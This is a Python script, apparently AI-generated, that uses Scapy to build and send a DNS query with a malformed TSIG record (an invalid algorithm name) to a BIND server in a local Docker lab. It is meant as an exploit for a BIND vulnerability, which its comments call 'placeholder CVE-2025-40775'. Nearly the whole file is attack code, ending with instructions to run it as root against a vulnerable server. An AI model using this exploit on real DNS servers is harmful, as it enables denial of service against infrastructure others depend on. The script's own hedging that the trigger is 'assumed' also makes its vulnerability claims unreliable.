from scapy.all import *  # Try a wildcard import to catch all Scapy names
load_layer("dns")  # Explicitly load DNS layers
import time

# Configuration
target_dns_server_ip = "127.0.0.1"  # Target localhost as Docker will expose the port there
target_dns_server_port = 53530       # The new host port mapped to BIND's container port 53
target_domain = "example.com"

# DNS Query details
query_name = target_domain
query_type = "A"
dns_transaction_id = 12345 # Arbitrary transaction ID

# Craft the malformed TSIG record
# The vulnerability is assumed to be triggered by an invalid algorithm name.
# The prompt mentioned "ID 255". We'll use a string that might represent this or be generally invalid.
tsig_algo_name = "invalid-algo-id-255.example.com." # Needs to be a FQDN-like string for algo_name

# Key name for TSIG (can be arbitrary for this exploit if the check is before key validation)
key_name = "exploit.key.name."

# TSIG's time_signed field. Scapy will use current time if None.
# Forcing it to be an int for clarity, as per Scapy's usual handling for struct packing.
current_time_signed = int(time.time())

malformed_tsig = DNSRRTSIG(
    rrname=key_name,
    type='TSIG',
    rclass=255, # ANY
    ttl=0,
    algo_name=tsig_algo_name.encode('utf-8'), # Use the potentially problematic FQDN-like algorithm name
    time_signed=current_time_signed,
    fudge=300,
    mac_len=0,       # Explicitly set to 0
    mac_data=b'',    # Explicitly set to empty bytes
    original_id=dns_transaction_id,
    error=0,
    other_len=0,
    other_data=b''
)

# Build the DNS packet
dns_layer = DNS(
    id=dns_transaction_id,
    qr=0,           # 0 for Query
    opcode=0,       # 0 for Standard Query
    rd=1,           # Recursion Desired
    qdcount=1,      # One question
    ancount=0,      # Zero answers
    nscount=0,      # Zero authority records
    arcount=1,      # One additional record (our TSIG)
    qd=DNSQR(qname=query_name, qtype=query_type), # The question
    ar=malformed_tsig  # The additional record
)

# IP and UDP layers
ip_layer = IP(dst=target_dns_server_ip)
udp_layer = UDP(sport=54321, dport=target_dns_server_port) # Use the configured port

# Full packet
packet = ip_layer / udp_layer / dns_layer

print("Crafted packet summary:")
packet.show()

print(f"\nSending packet to {target_dns_server_ip}:{target_dns_server_port}...")
# Note: Sending packets with Scapy typically requires root/administrator privileges.
try:
    send(packet, verbose=1)
    print("Packet sent.")
except PermissionError:
    print("Permission denied: Sending packets requires root/administrator privileges.")
except Exception as e:
    print(f"An error occurred while sending the packet: {e}")

print("\n---")
print("To run this script, you might need to use 'sudo python dns_exploit.py' (on Linux/macOS)")
print("or run your terminal/IDE as Administrator (on Windows).")
print(f"Ensure the target BIND server is running (Docker port {target_dns_server_port} mapped to container 53) and is vulnerable.")
print("The effectiveness depends on the specific BIND vulnerability (e.g., placeholder CVE-2025-40775).")

